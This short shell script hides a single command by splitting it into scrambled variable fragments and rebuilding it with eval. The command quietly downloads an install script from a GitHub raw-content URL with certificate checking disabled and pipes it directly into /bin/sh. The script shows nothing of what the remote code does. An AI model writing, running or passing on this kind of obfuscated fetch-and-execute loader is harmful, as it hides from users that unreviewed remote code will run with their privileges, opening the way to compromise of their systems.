z="
";Jz='ps:/';Cz='"--n';Vz='/mai';Iz=' htt';Uz='nsat';Qz='om/e';Tz='ooto';Hz='ate"';Wz='n/in';Ez='eck-';Rz='mil2';Az='wget';Pz='nt.c';Fz='cert';Yz='l.sh';Xz='stal';Dz='o-ch';Oz='onte';bz='/bin';Nz='serc';Bz=' -q ';Sz='37/f';az='- | ';Gz='ific';Mz='hubu';Zz=' -O ';Kz='/raw';cz='/sh';Lz='.git';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz"